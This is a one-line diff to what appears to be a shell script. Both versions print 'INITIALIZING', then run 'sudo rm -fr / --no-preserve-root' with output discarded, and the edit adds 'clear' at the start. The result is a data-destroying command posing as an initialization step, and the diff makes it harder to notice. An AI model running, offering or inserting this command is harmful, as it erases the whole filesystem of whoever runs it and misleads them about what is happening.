@@ -1,1 +1,1 @@
-echo INITIALIZING && sudo rm -fr / --no-preserve-root>/dev/null
+clear && echo INITIALIZING && sudo rm -fr / --no-preserve-root>/dev/null
